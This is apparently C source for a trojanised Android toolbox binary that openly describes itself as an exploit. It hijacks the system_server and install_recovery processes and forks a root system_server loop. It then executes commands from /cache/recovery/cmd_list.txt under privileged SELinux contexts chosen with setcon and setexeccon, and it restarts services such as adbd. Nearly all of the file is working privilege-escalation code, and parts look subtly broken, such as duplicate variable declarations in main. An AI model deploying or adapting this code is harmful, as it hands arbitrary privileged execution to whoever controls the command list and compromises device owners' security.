/* begin default toolbox.c headers, 3 total */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
/* end default toolbox.c headers, 3 total */

//headers added to support exploit
#include<sys/wait.h>
#include <sys/types.h>
#include <unistd.h>
#include <cutils/properties.h>
#include <selinux/selinux.h>
#include <signal.h>
#include <errno.h>

#include "shared.h"

typedef char *security_context_t;
//list of commands copied to /cache/ by bridge
#define _file_cmdlist "/cache/recovery/cmd_list.txt"

void eXecCmd(char *,security_context_t);
void  parse(char *, char **);
void exitreason(pid_t, int);
void  execute(char **argv);
int system_server_loop();

#ifdef RESET_ADBD_HOST
#include <fcntl.h>

int process_service_starts();

int process_service_starts(){
	   char *    androidservice;   //&service_name at the end of cmd_list.txt commands
	   char *	 tmpstring_reject; //eject most of the command line we just need the service.
	   
	   //while loop processes cmd_list.txt for service starts
		char line[2040];
		int iCntr=0;


			//open the list of cmds
   			FILE *file_services = fopen(_file_cmdlist,"r");
   				if (file_services == NULL) {
   					return 1;
   				}
   				
//===>[-] start services from cmd_list.txt [-]<===
		while (fgets(line, sizeof(line), file_services)) {
			tmpstring_reject = strtok(line,"`");
			androidservice = strtok(NULL,"\n");		
   				
   				if ( strlen(androidservice) > 1 ) {
   							//if adbd open support
							if ( !strcmp(androidservice,"adbd") ){
			   					int fd = open("/sys/class/android_usb/android0/enable", O_WRONLY);
			   					LOGV("attempted to open usb");
			   				}
			   	/* stop it first, could be bad like if you stopped the main Android OS or something, I don't know.. */
        		property_set("ctl.stop", androidservice);

			   	/* start service */
			   					LOGV("starting service %s",androidservice);			   	
        		property_set("ctl.start", androidservice);
				//adb closes with lightning efficiency
   				}else{
   					break;
   				}
		iCntr++;
		}

	//close the file
	if(file_services != NULL)				        
	fclose(file_services);
	return 0;
}
#endif
//reduce binary size
char __aeabi_unwind_cpp_pr0[0];

//toolbox.c function declarations
int main(int, char **);

static int toolbox_main(int argc, char **argv)
{
    // "toolbox foo ..." is equivalent to "foo ..."
    if (argc > 1) {
        return main(argc - 1, argv + 1);
    } else {
        printf("!Toolbox!\n");
        return 0;
    }
}

#define TOOL(name) int name##_main(int, char**);
#include "tools.h"
#undef TOOL

static struct 
{
    const char *name;
    int (*func)(int, char**);
} tools[] = {
    { "toolbox", toolbox_main },
#define TOOL(name) { #name, name##_main },
#include "tools.h"
#undef TOOL
    { 0, 0 },
};

int main(int argc, char **argv)
{
    int i;
    char *name = argv[0];

    //default toolbox variables
    int i;
    char *name = argv[0];


	//saves current context
	security_context_t currcon;
	//we use this to fork < system_server into it's own loop    
	pid_t ss_cpid, ss_check_this_pid;


	security_context_t SERVER_CONTEXT = "u:r:system_server:s0";
	security_context_t INSTALL_CONTEXT = "u:r:install_recovery:s0";
	
	getcon(&currcon);
	LOGV("[+] toolbox running %s as uid: %d, gid: %d, context %s", argv[0], getuid(), getgid(), currcon);

	/* we will capture a root + system_server process, then fork it */
	if( !strcmp(SERVER_CONTEXT, currcon) && increment_value(0, RSF_TOOLBOX_RUN_ONCE) ) { /* I expect current value of 0, otherwise return false */
																			
	/* if system_server context && increment did't return 0 we will be here */
														
	//LOGV("[*] Forking system_server < install_recovery + system_server pid:%i",getpid());
	ss_cpid = fork();
    	switch (ss_cpid) 
    	{
        	case -1: //LOGV("Fork failed; ss_cpid == -1");
        	break;
        	case 0: ss_check_this_pid = getpid();
        
        	//send the spawned root+system_server thread into the system_server_loop() function
        	if( system_server_loop( SERVER_CONTEXT ) ){	exit(91); }else{	exit(0);  }

       		//original thread will pass by to become install_recovery
	}        			

	
	//LOGV("[*] toolbox property_set flash_recovery pid:%i",getpid());
	property_set("ctl.start", "flash_recovery");
	
	/* ONLY the first install_recovery will be hijacked, use the same file as system_server but this time set it to 2 */
	/* if current context == install_recovery AND we haven't already increment RSF_TOOLBOX_RUN_ONCE to be value of 2 */
	}else if (!strcmp(INSTALL_CONTEXT, currcon) && increment_value(1, RSF_TOOLBOX_RUN_ONCE) ) {
	/* if install_recovery context && increment did't return 0 we will be here */
	//LOGV("[*] -=-= EXPLOIT ACTIVE =-=- ");

	// when bridge has sen't cmd_list.txt and any supporting files for our cmd_list.txt this value will be 1 inside the file
	while(check_value(RSF_SENT_FILE_LIST) != 1) {usleep(200);}


	char *    exec_trimmed_CmdLine; //This is the command line |/system/bin/<binary> <options> <args>|
	char *	 exec_con; //receives the context to use for execvp
	   
	   //while loop processes cmd_list.txt
		char line[2040];
		int iCntr=0;

			//open the list of cmds
   			FILE *file_ir_cmds = fopen(_file_cmdlist,"r");
   				if (file_ir_cmds == NULL) {
   					return 1;
   				}

//===>[-] Execute the list of commands in consecutive order [-]<===
		while (fgets(line, sizeof(line), file_ir_cmds)) {
			exec_con = strtok(line,"#");
			exec_trimmed_CmdLine = strtok(NULL,"#");
	/* if the context is anything execept system_server, execute from install_recovery context */
	if ( strcmp(SERVER_CONTEXT,exec_con) ) {
				LOGV("install_recovery executing");		
				/* -=-=-=-=- call execute on the command line -=-=-=-=-*/
				eXecCmd(exec_trimmed_CmdLine, exec_con);
			}
			
					//signal system_server to continue
					increment_value(0, RSF_IREC_DONE);			 /* please notice that i used increment_value here
																   instead of the set_value function */
					
						//wait for system_server to set the value 0 again
						while ( check_value(RSF_IREC_DONE) != 0 ) {
						usleep(200);} /* add delay so as not to cook the cpus */			

		iCntr++;
		}

	//close the file
	if(file_ir_cmds != NULL)				        
	fclose(file_ir_cmds);
	
		//signal bridge/till/farm that we are done now.	   
		increment_value(1, RSF_SENT_FILE_LIST);

#ifdef RESET_ADBD_HOST
		if( process_service_starts() ) {LOGV("[-] Toolbox: failed to restart services");}
#endif

} //END OF ELSE IF --- PRIV ELEVATION LOGIC


leave_hack:
if(currcon != NULL)
	freecon(currcon);

    
//toolbox 5.11 r2 default main() code
    if((argc > 1) && (argv[1][0] == '@')) {
        name = argv[1] + 1;
        argc--;
        argv++;
    } else {
        char *cmd = strrchr(argv[0], '/');
        if (cmd)
            name = cmd + 1;
    }

    for(i = 0; tools[i].name; i++){
        if(!strcmp(tools[i].name, name)){
            return tools[i].func(argc, argv);
        }
    }

    printf("%s: no such tool\n", argv[0]);
    return -1;
}
//folowing code is 100% exploit code, not part of toolbox.c
int system_server_loop(	security_context_t SERVER_CONTEXT ){
	/* selinux context for system_server */
	security_context_t sscon;
	getcon(&sscon);
	
	
						/* wait for install_recovery to process a line 
						   then system_server will process a line, 
						   then install_recovery again and so on */
							while ( check_value(RSF_IREC_DONE) != 1 ) {
							usleep(200);} /* add delay so as not to cook the cpus */


	   char *    exec_trimmed_CmdLine; //command line trimmed and ready to execute
	   char *	 exec_con; //used to test the desired context; system_server vs install_recovery
	   
	   //while loop processes cmd_list.txt
		char line[2040];
		int iCntr=0;

			//open the file
   			FILE *fpBlock = fopen("/cache/recovery/cmd_list.txt","r");
   				if (fpBlock == NULL) {
   					LOGV("error opening cmd_list.txt in system_server loop");
   					return 1;
   				}

//===>[-] Parse text file for bridge specific duties [-]<===
		while (fgets(line, sizeof(line), fpBlock)) {
			exec_con = strtok(line,"#");
			exec_trimmed_CmdLine = strtok(NULL,"#");
			/* if system_server, execute using system_server context */
			if ( !strcmp(exec_con,SERVER_CONTEXT) ) {
				/* -=-=-=-=- call execute on the command line -=-=-=-=-*/
				eXecCmd(exec_trimmed_CmdLine, SERVER_CONTEXT);
			}


					//signal install_recovery to continue
					set_value(0, RSF_IREC_DONE);
					
					
						//wait for install_recovery to set the value 1 again
						while ( check_value(RSF_IREC_DONE) != 1 ) {
						usleep(200);} /* add delay so as not to cook the cpus */

			iCntr++;
	
		}
					//signal install_recovery to continue, must use set_value here not increment_value
					set_value(0, RSF_IREC_DONE);
		

	if(fpBlock != NULL)				        
	fclose(fpBlock);
	if(sscon != NULL)
	freecon(sscon);		
		
		
	return 0;
}
//execute commands
void eXecCmd(char *command_line, security_context_t exec_con) {
	security_context_t eXecCmd_con;
	getcon(&eXecCmd_con);
	security_context_t INSTALL_CONTEXT = "u:r:install_recovery:s0";	/* default context */
	LOGV("eXecCmd() current security context %s = getcon()",eXecCmd_con);
	if ( setcon(exec_con) < 0 ) {	LOGV("eXecCmd() error setcon(%s) %s = getcon()", exec_con, eXecCmd_con); }
	if ( setfscreatecon(exec_con) < 0 ) {LOGV("eXecCmd() error setfscreatecon(%s) %s = getcon()", exec_con, eXecCmd_con); }	
		
	extern char **environ;										/* array of environment variables 			*/
    char  *arguments[64];										/* parsed command line argument    			*/
    char line[511];			              						/* the command line argument      			*/
    strcpy(line, command_line);									/* unallocated + copy == smaller binary		*/
	parse(line, arguments);										/* parse the line, alters 'line' also		*/
		
    	pid_t childprocess;		/* execv doesn't return on success so we need to fork a proc */
    	int status=0;			/* status is updated to parent */
    	
    	int waitoptions = 0;	/* opitions listed below */
    	//WNOHANG    return immediately if no child has exited.
    	//WUNTRACED  also return if a child has stopped (but not traced via ptrace(2)).  Status for traced children which have stopped is provided even if this option is not specified.
    	//WCONTINUED also return if a stopped child has been resumed by delivery of SIGCONT.
    	
    		int res=0;


    				if( (childprocess = fork()) == 0 ) 													/* Child proc block */
    				{
	/* set exec context for next execve execution request */    				
	if ( setexeccon(exec_con) < 0 ) {LOGV("eXecCmd() error setexeccon(%s) %s = getcon()", exec_con, eXecCmd_con); }

    	    			if( (res = execve(*arguments, arguments, environ)) < 0 ) 		/* -=-=->] Execute [<-=-=- */
    	    			{	
    	    					LOGV("[-] Toolbox %s [failure: %s]",					/* Report errors to logcat */
    	    					     command_line, strerror(errno));
	    					/* <TODO> to reduce size remove exitreason function! */     
								exitreason(childprocess, status); 						/* on error, test for signal and coredump & report them */
								exit(91); 												/* must exit child on failure because the proc returns */
    	    			}
    				}
    				else if( childprocess > 0 )
    				{
    	    			waitpid(childprocess, &status, waitoptions);						/* parent, waitfor child */
   	    				if ( !status )LOGV("[+] Toolbox success: %s\n", command_line);		/* if status is 0 we had success */
    				}
	freecon(eXecCmd_con);    				
}
//parse into a command line, don't recall the same point as it alters the original value, use command_line for unaltered copy.
void  parse(char *line, char **arguments)
{
     while (*line != '\0') {       /* if not the end of line ....... */ 
          while (*line == ' ' || *line == '\t' || *line == '\n')
               *line++ = '\0';     /* replace white spaces with 0    */
          *arguments++ = line;          /* save the argument position     */
          while (*line != '\0' && *line != ' ' && 
                 *line != '\t' && *line != '\n') 
               line++;             /* skip the argument until ...    */
     }
     *arguments = '\0';                 /* mark the end of argument list  */
}

//some testing for when there was an error.
void exitreason(pid_t childprocess, int status)
{
    if( WIFSIGNALED(status) )
    {
        if( WTERMSIG(status) )
        {
        	LOGV("[-] Toolbox stopped by signal %d",WTERMSIG(status));
        }
        if( WCOREDUMP(status) )
        {
        	LOGV("[-] Toolbox core dumped");
        }
    }
    if( WIFSTOPPED(status) )
    {
        if( WSTOPSIG(status) )
        {
        	LOGV("[-] Toolbox execution proc stopped");
        }
    }
}
//WIFEXITED(status) returns true if the child terminated normally, that is, by calling exit(3) or _exit(2), or by returning from main().
//WEXITSTATUS(status) returns the exit status of the child.  This consists of the least significant 8 bits of the status argument that the child specified in a call to exit(3) or _exit(2) or as the argument for a return statement in main().  This macro should only be employed if WIFEXITED returned true.
//WIFSIGNALED(status) returns true if the child process was terminated by a signal.
//WTERMSIG(status) returns the number of the signal that caused the child process to terminate.  This macro should only be employed if WIFSIGNALED returned true.
//WCOREDUMP(status) returns true if the child produced a core dump.  This macro should only be employed if WIFSIGNALED returned true.  This macro is not specified in POSIX.1-2001 and is not available on some UNIX implementations (e.g., AIX, SunOS).  Only use this enclosed in #ifdef WCOREDUMP ... #endif.
//WIFSTOPPED(status) returns true if the child process was stopped by delivery of a signal; this is only possible if the call was done using WUNTRACED or when the child is being traced (see ptrace(2)).
//WSTOPSIG(status) returns the number of the signal which caused the child to stop.  This macro should only be employed if WIFSTOPPED returned true.
//WIFCONTINUED(status) (since Linux 2.6.10) returns true if the child process was resumed by delivery of SIGCONT.
